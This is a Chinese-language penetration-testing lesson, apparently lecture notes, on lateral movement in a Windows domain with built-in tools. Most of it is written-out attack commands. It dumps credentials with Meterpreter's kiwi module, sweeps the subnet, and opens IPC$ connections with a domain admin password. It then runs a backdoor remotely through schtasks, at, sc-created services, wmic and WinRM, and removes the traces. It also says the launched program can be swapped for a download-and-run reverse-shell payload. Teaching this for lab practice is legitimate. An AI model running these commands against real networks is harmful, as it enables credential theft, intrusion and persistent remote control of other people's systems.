#  078：利用Windows内置工具进行横向移动 🚀

在本节课中，我们将学习如何利用Windows操作系统内置的工具，在已经获取一台主机权限的基础上，向网络内的其他主机进行横向移动。我们将重点介绍IPC$共享连接、计划任务、SC命令、WMIC以及WinRM等工具的使用方法。

## 概述

![](img/fb9f3abd5c122b216896ee19ad4d6814_1.png)

横向移动是渗透测试和内网渗透中的关键环节。当我们成功控制一台主机（跳板机）后，下一步就是利用这台主机作为跳板，去访问和控制同一网络内的其他主机。Windows系统自带了许多强大的管理工具，可以用于实现这一目的，而无需借助外部软件。

![](img/fb9f3abd5c122b216896ee19ad4d6814_3.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_5.png)

上一节我们介绍了信息收集和权限提升，本节中我们来看看如何利用已获取的凭证进行横向移动。

![](img/fb9f3abd5c122b216896ee19ad4d6814_7.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_9.png)

## 1. 信息收集与凭证获取 🔍

![](img/fb9f3abd5c122b216896ee19ad4d6814_11.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_13.png)

在开始横向移动之前，我们需要从已控制的主机上收集信息，特别是获取可用于登录其他主机的凭证。

我们已经通过Meterpreter会话获取了`SYSTEM`权限。接下来可以进行信息收集。

![](img/fb9f3abd5c122b216896ee19ad4d6814_15.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_17.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_19.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_21.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_22.png)

以下是获取当前主机明文密码的几种方法，使用Mimikatz模块：

![](img/fb9f3abd5c122b216896ee19ad4d6814_24.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_26.png)

```
meterpreter > load kiwi
meterpreter > creds_all
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_28.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_29.png)

执行`creds_all`命令后，可能会返回类似以下的信息，其中包含域用户`Administrator`的明文密码：
```
Domain: DE1
User: Administrator
Password: Password123!
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_31.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_33.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_35.png)

我们还可以尝试其他命令来获取哈希或明文：
```
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_37.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_39.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_41.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_43.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_45.png)

通过以上方法，我们得到了域`DE1`的管理员账号`Administrator`及其密码。由于域管理员账号可以登录域内的任何主机，因此这些凭证对我们进行横向移动至关重要。

![](img/fb9f3abd5c122b216896ee19ad4d6814_47.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_49.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_51.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_53.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_55.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_57.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_58.png)

## 2. 探测内网存活主机 📡

![](img/fb9f3abd5c122b216896ee19ad4d6814_60.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_62.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_64.png)

在尝试连接其他主机前，我们需要知道目标网络中有哪些主机是存活的。

![](img/fb9f3abd5c122b216896ee19ad4d6814_66.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_68.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_70.png)

我们可以从已获取的Meterpreter会话中，使用shell命令进行内网主机存活探测：
```
meterpreter > shell
C:\> for /L %i in (1,1,254) do @ping -n 1 -w 50 10.10.10.%i | findstr "TTL"
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_72.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_74.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_76.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_78.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_80.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_82.png)

假设探测发现IP地址为`10.10.10.201`的主机存活，并且它开放了`445`端口（文件共享服务）和`135`端口（RPC服务），这满足了IPC$连接的基本条件。

![](img/fb9f3abd5c122b216896ee19ad4d6814_84.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_86.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_88.png)

## 3. 利用IPC$进行横向移动 🔗

![](img/fb9f3abd5c122b216896ee19ad4d6814_90.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_92.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_94.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_96.png)

IPC$（进程间通信）共享是Windows用于管理远程计算机的隐藏共享。建立IPC$连接后，可以进行文件操作、命令执行等。

![](img/fb9f3abd5c122b216896ee19ad4d6814_98.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_100.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_102.png)

### 建立IPC$连接

![](img/fb9f3abd5c122b216896ee19ad4d6814_103.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_105.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_107.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_109.png)

首先，检查并清理可能存在的旧连接，然后使用获取的域管理员凭证建立新连接：
```
C:\> net use \\10.10.10.201\IPC$ /delete
C:\> net use \\10.10.10.201\IPC$ Password123! /user:DE1\Administrator
```
命令成功执行，表示连接已建立。

![](img/fb9f3abd5c122b216896ee19ad4d6814_111.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_113.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_115.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_117.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_119.png)

### IPC$连接的应用

![](img/fb9f3abd5c122b216896ee19ad4d6814_121.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_123.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_125.png)

建立连接后，我们可以进行多种操作：

![](img/fb9f3abd5c122b216896ee19ad4d6814_127.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_129.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_131.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_133.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_135.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_136.png)

**访问远程文件系统：**
```
C:\> dir \\10.10.10.201\C$
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_138.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_140.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_142.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_144.png)

**上传文件到远程主机：**
```
C:\> copy C:\test.exe \\10.10.10.201\C$\test.exe
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_146.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_147.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_149.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_151.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_153.png)

**从远程主机下载文件：**
```
C:\> copy \\10.10.10.201\C$\important.txt C:\local_copy.txt
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_155.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_157.png)

**查看远程主机时间（为计划任务做准备）：**
```
C:\> net time \\10.10.10.201
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_159.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_161.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_163.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_165.png)

## 4. 利用计划任务执行命令 ⏰

![](img/fb9f3abd5c122b216896ee19ad4d6814_167.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_169.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_171.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_173.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_175.png)

计划任务（`schtasks` 或 `at`）允许我们在远程主机上定时执行命令或程序，从而获取反向Shell。

![](img/fb9f3abd5c122b216896ee19ad4d6814_177.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_178.png)

### 使用 schtasks 命令

首先，将后门程序通过IPC$连接上传到目标主机。然后，创建计划任务立即执行它：
```
C:\> schtasks /create /s 10.10.10.201 /u DE1\Administrator /p Password123! /sc minute /mo 1 /tn "BackdoorTask" /tr "C:\test.exe" /ru SYSTEM
```
*   `/s`: 指定远程主机。
*   `/u` 和 `/p`: 提供用户名和密码。
*   `/sc minute /mo 1`: 设置为每分钟执行一次。
*   `/tn`: 任务名称。
*   `/tr`: 要执行的程序路径。

![](img/fb9f3abd5c122b216896ee19ad4d6814_180.png)

任务创建后，等待其执行，即可在攻击机（如Metasploit）上收到来自`10.10.10.201`的反向Shell连接。

![](img/fb9f3abd5c122b216896ee19ad4d6814_182.png)

**清理痕迹：**
```
C:\> schtasks /delete /s 10.10.10.201 /u DE1\Administrator /p Password123! /tn "BackdoorTask"
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_184.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_186.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_188.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_190.png)

### 使用 at 命令（旧系统）

![](img/fb9f3abd5c122b216896ee19ad4d6814_192.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_193.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_195.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_196.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_198.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_200.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_201.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_202.png)

在Windows Server 2008或Win7等系统上，也可以使用`at`命令：
```
C:\> net time \\10.10.10.201
C:\> at \\10.10.10.201 21:10 C:\test.exe
```
此命令会在远程主机的`21:10`执行`C:\test.exe`。

![](img/fb9f3abd5c122b216896ee19ad4d6814_204.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_206.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_208.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_210.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_212.png)

## 5. 利用SC命令管理服务 ⚙️

![](img/fb9f3abd5c122b216896ee19ad4d6814_214.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_216.png)

SC命令可以远程创建、启动、停止服务。我们可以创建一个服务来执行我们的后门程序。

![](img/fb9f3abd5c122b216896ee19ad4d6814_218.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_220.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_222.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_224.png)

**在远程主机上创建服务：**
```
C:\> sc \\10.10.10.201 create BackdoorService binpath= "cmd /c C:\test.exe" start= auto
```

**启动远程服务：**
```
C:\> sc \\10.10.10.201 start BackdoorService
```
服务启动后，会执行`binpath`指定的命令，从而触发我们的后门。

![](img/fb9f3abd5c122b216896ee19ad4d6814_226.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_228.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_230.png)

**查询服务状态：**
```
C:\> sc \\10.10.10.201 qc BackdoorService
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_232.png)

## 6. 利用WMIC执行命令 💻

WMIC（Windows管理工具命令行）支持远程执行命令。但默认无回显，通常用于创建进程。

![](img/fb9f3abd5c122b216896ee19ad4d6814_234.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_236.png)

**在远程主机上创建进程（例如启动计算器）：**
```
C:\> wmic /node:10.10.10.201 /user:DE1\Administrator /password:Password123! process call create "calc.exe"
```
此命令会返回创建的进程ID。

![](img/fb9f3abd5c122b216896ee19ad4d6814_238.png)

**结合反弹Shell命令：**
我们可以将`calc.exe`替换为任何能在目标机器上执行的命令，例如一个通过`certutil`或`powershell`下载并执行Payload的命令，从而直接获取反向Shell。

![](img/fb9f3abd5c122b216896ee19ad4d6814_240.png)

## 7. 利用WinRM执行命令 🌐

![](img/fb9f3abd5c122b216896ee19ad4d6814_242.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_244.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_246.png)

WinRM（Windows远程管理）是Windows的远程管理服务，默认在2012及以上版本开启，允许远程执行PowerShell命令。

![](img/fb9f3abd5c122b216896ee19ad4d6814_248.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_250.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_252.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_253.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_255.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_257.png)

**首先，在目标主机上启用WinRM（如果需要）：**
```
C:\> winrm quickconfig
C:\> winrm set winrm/config/client @{TrustedHosts="*"}
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_259.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_261.png)

**使用WinRS执行命令（有回显）：**
```
C:\> winrs -r:http://10.10.10.201:5985 -u:DE1\Administrator -p:Password123! ipconfig
```
此命令会远程执行`ipconfig`并返回结果。

**使用WinRM的Invoke-WmiMethod创建进程（无回显）：**
```
C:\> powershell -Command "$cred = Get-Credential; Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'calc.exe' -ComputerName 10.10.10.201 -Credential $cred"
```
同样，可以将`calc.exe`替换为反弹Shell的命令。

![](img/fb9f3abd5c122b216896ee19ad4d6814_263.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_264.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_265.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_267.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_269.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_271.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_273.png)

**使用WinRM创建并启动服务：**
通过PowerShell，可以远程调用WMI创建和启动服务来执行后门，原理与SC命令类似。

![](img/fb9f3abd5c122b216896ee19ad4d6814_275.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_277.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_279.png)

## 总结

![](img/fb9f3abd5c122b216896ee19ad4d6814_281.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_283.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_285.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_286.png)

本节课我们一起学习了利用Windows内置工具进行横向移动的多种方法：
1.  **IPC$共享连接**：用于建立远程管理通道，进行文件传输和基础信息获取。
2.  **计划任务（schtasks/at）**：用于在远程主机上定时执行我们的Payload。
3.  **SC命令**：用于远程创建和启动服务，以系统权限执行命令。
4.  **WMIC**：用于在远程主机上创建进程（无回显）。
5.  **WinRM**：强大的远程管理协议，可以执行命令（有回显）和管理远程服务。

![](img/fb9f3abd5c122b216896ee19ad4d6814_288.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_290.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_292.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_294.png)

这些方法的核心思路都是：**利用从已控主机获取的高权限凭证，通过Windows自带的管理功能，在远程主机上执行代码**。掌握这些技术对于理解内网渗透的横向移动至关重要。请大家务必在实验环境中亲手操作一遍，以加深理解。